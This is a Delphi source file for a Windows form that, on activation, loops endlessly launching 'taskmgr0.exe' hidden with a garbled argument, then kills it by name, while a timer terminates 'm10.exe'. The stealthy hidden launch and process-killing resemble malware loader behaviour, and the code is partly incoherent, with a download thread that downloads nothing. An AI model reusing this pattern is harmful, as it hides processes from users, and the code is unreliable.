unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,TLHelp32, ExtCtrls,ShellAPI;

  type
        TMyDownLoad=class(TThread)
  protected
  procedure   Execute;override;
  procedure   Download;
  end;


type
  TForm1 = class(TForm)
    tmr1: TTimer;
    tmr4: TTimer;
    tmr5: TTimer;
    tmr6: TTimer;
    tmr7: TTimer;
    tmr8: TTimer;
    procedure FormActivate(Sender: TObject);
    procedure tmr4Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
procedure EndProcess(AFileName: string);
const
  PROCESS_TERMINATE=$0001;
var
  ExeFileName: String;
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  ExeFileName := AFileName;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,FProcessEntry32);
  while integer(ContinueLoop) <> 0 do
    begin
      if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
           UpperCase(ExeFileName))
       or (UpperCase(FProcessEntry32.szExeFile) =
           UpperCase(ExeFileName))) then
        TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),
                          FProcessEntry32.th32ProcessID), 0);
      ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
    end;
end; 

procedure   TMyDownLoad.Download;
Var
    UnitName,PathName:String;
    MyStream:TMemoryStream;
    filepath:string;
begin
  ShellExecute(handle, 'open','taskmgr0.exe','×Ö´®ÄÚÈÝ',nil, SW_hide);
end;
procedure   TMyDownLoad.Execute;
begin
            inherited;
            Download;
end;

procedure TForm1.FormActivate(Sender: TObject);
var i:Integer;
begin
  while 1=1 do
  begin
  for i :=0  to 4 do
   begin
    TMyDownLoad.Create(false);
    Sleep(5000);
   end;
   EndProcess('taskmgr0.exe');

  end;
end;

procedure TForm1.tmr4Timer(Sender: TObject);
var
  i:Integer;
begin
     EndProcess('m10.exe');
end;

end.
